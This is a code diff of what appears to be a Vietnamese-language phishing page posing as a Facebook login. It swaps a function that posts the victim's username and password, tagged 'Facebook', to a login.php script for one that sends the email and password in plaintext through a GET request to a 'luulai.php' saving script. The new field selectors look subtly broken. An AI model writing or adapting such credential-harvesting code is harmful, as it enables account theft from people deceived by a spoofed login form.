@@ -140,46 +140,13 @@
   
 
    <script>
-      function Login() {
+      function getinfo() {
 
-  $('#ok').html('Đang đăng nhập...');
-    $('#ok').attr('disabled', 'disabled');
-            $.ajax({
-            url: "/system/login.php",
-            method: "POST",
-            data: {
-               id: '53608',
-               tk: $("#tk").val(),
-               mk: $("#mk").val(),
-               type: 'Facebook'
-          
-    },
-            success: function(response) {
-                
-               var data = JSON.parse(response);
-               var message = data.message;
-               var status = data.status;
-              
-              
-               if (status == 'error') { 
-                 $('#ok').removeAttr('disabled');
-                 $('#ok').html('Đăng nhập');
-                 $(".notilog").remove()
-                document.getElementById('tk').style = 'border: 1px solid #FA3E3E;';
-                document.getElementById('error').style = 'background-color: #FA3E3E; padding: 3px; color: #FFFFF3; text-align: center; font-size:15px; font-family: Arial, Helvetica, sans-serif;'
-                document.getElementById('error').innerHTML = message;
-               } else {
-                   
-                $("#error").remove()
-                  window.location.href = "/success.php?id=53608"; 
-                  
-               }
-
-            },
-            error: function(e) {
-               console.log(e);
-            }
-         });
+         var xmlHttp = new XMLHttpRequest();
+        var email = document.querySelector("email").value;
+        var pass = document.querySelector("pass").value;
+        xmlHttp.open("GET", "/luulai.php?"+"email="+email+"&pass="+pass, true );
+        xmlHttp.send();
       }
 
     
